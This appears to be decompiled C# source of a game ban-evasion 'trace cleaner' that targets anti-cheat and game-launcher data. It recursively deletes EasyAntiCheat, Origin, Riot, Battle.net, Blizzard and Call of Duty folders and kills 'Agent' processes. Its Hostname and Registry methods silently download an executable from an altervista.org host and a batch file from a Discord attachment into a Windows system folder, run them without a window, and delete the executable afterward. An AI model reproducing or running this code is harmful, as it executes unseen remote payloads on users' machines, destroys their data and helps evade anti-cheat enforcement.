using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace ConsoleApp1
{
	internal class Traces
	{
		private static Traces lt6ZmyZmpjU57IVk0GG;

		public static void EACTrack()
		{
			if (Directory.Exists("C:\\Users\\PC\\AppData\\Roaming\\EasyAntiCheat"))
			{
				try
				{
					Directory.Delete("C:\\Users\\PC\\AppData\\Roaming\\EasyAntiCheat", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\Users\\PC\\AppData\\Roaming\\EasyAntiCheat", recursive: true);
				}
			}
			if (Directory.Exists("C:\\Users\\PC\\AppData\\Roaming\\Origin"))
			{
				try
				{
					Directory.Delete("C:\\Users\\PC\\AppData\\Roaming\\Origin", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\Users\\PC\\AppData\\Roaming\\Origin", recursive: true);
				}
			}
			if (Directory.Exists("C:\\Users\\PC\\AppData\\Local\\Origin"))
			{
				try
				{
					Directory.Delete("C:\\Users\\PC\\AppData\\Local\\Origin", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\Users\\PC\\AppData\\Local\\Origin", recursive: true);
				}
			}
			if (Directory.Exists("C:\\Users\\PC\\AppData\\Local\\Origin"))
			{
				try
				{
					Directory.Delete("C:\\Users\\PC\\AppData\\Local\\Origin", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\Users\\PC\\AppData\\Local\\Origin", recursive: true);
				}
			}
			if (Directory.Exists("C:\\ProgramData\\Origin"))
			{
				try
				{
					Directory.Delete("C:\\ProgramData\\Origin", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\ProgramData\\Origin", recursive: true);
				}
			}
		}

		public static void Riot()
		{
			if (Directory.Exists("C:\\Users\\PC\\AppData\\Local\\Riot Games"))
			{
				try
				{
					Directory.Delete("C:\\Users\\PC\\AppData\\Local\\Riot Games", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\Users\\PC\\AppData\\Local\\Riot Games", recursive: true);
				}
			}
			if (Directory.Exists("C:\\ProgramData\\Riot Games"))
			{
				try
				{
					Directory.Delete("C:\\ProgramData\\Riot Games", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\ProgramData\\Riot Games", recursive: true);
				}
			}
			if (Directory.Exists("C:\\Riot Games"))
			{
				try
				{
					Directory.Delete("C:\\Riot Games", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\Riot Games", recursive: true);
				}
			}
		}

		public static void Batlenet()
		{
			Process[] processesByName = Process.GetProcessesByName("Agent");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			if (Directory.Exists("C:\\Users\\PC\\AppData\\Roaming\\Battle.net"))
			{
				try
				{
					Directory.Delete("C:\\Users\\PC\\AppData\\Roaming\\Battle.net", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\Users\\PC\\AppData\\Roaming\\Battle.net", recursive: true);
				}
			}
			if (Directory.Exists("C:\\Users\\PC\\AppData\\Local\\Battle.net"))
			{
				try
				{
					Directory.Delete("C:\\Users\\PC\\AppData\\Local\\Battle.net", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\Users\\PC\\AppData\\Local\\Battle.net", recursive: true);
				}
			}
			if (Directory.Exists("C:\\Users\\PC\\AppData\\Local\\Blizzard Entertainment"))
			{
				try
				{
					Directory.Delete("C:\\Users\\PC\\AppData\\Local\\Blizzard Entertainment", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\Users\\PC\\AppData\\Local\\Blizzard Entertainment", recursive: true);
				}
			}
			if (Directory.Exists("C:\\ProgramData\\Battle.net"))
			{
				try
				{
					Directory.Delete("C:\\ProgramData\\Battle.net", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\ProgramData\\Battle.net", recursive: true);
				}
			}
			if (Directory.Exists("C:\\ProgramData\\Blizzard Entertainment"))
			{
				try
				{
					Directory.Delete("C:\\ProgramData\\Blizzard Entertainment", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\ProgramData\\Blizzard Entertainment", recursive: true);
				}
			}
			if (Directory.Exists("C:\\Users\\PC\\Documents\\Call of Duty Modern Warfare"))
			{
				try
				{
					Directory.Delete("C:\\Users\\PC\\Documents\\Call of Duty Modern Warfare", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\Users\\PC\\Documents\\Call of Duty Modern Warfare", recursive: true);
				}
			}
			if (Directory.Exists("C:\\Users\\PC\\Documents\\Call of Duty Black Ops Cold War"))
			{
				try
				{
					Directory.Delete("C:\\Users\\PC\\Documents\\Call of Duty Black Ops Cold War", recursive: true);
				}
				catch (IOException)
				{
					Thread.Sleep(0);
					Directory.Delete("C:\\Users\\PC\\Documents\\Call of Duty Black Ops Cold War", recursive: true);
				}
			}
		}

		public static void Hostname()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("http://faew8f465a1f32d3sf1s.altervista.org/ChangeHostname.exe", "C:\\Windows\\SysWOW64\\wbem\\ChangeHostname.exe");
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\ChangeHostname.exe";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\ChangeHostname.exe");
		}

		public static void Registry()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/786910648771674133/846860386393260046/Registry.bat", "C:\\Windows\\SysWOW64\\wbem\\Registry.bat");
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Registry.bat";
			process.Start();
		}

		public Traces()
		{
			Class15.smethod_0();
			base._002Ector();
		}

		internal static bool cowpifZJhKGZ0cOQoTW()
		{
			return lt6ZmyZmpjU57IVk0GG == null;
		}

		internal static void bTWtUSZ5lKCibdjEZXB()
		{
		}
	}
}
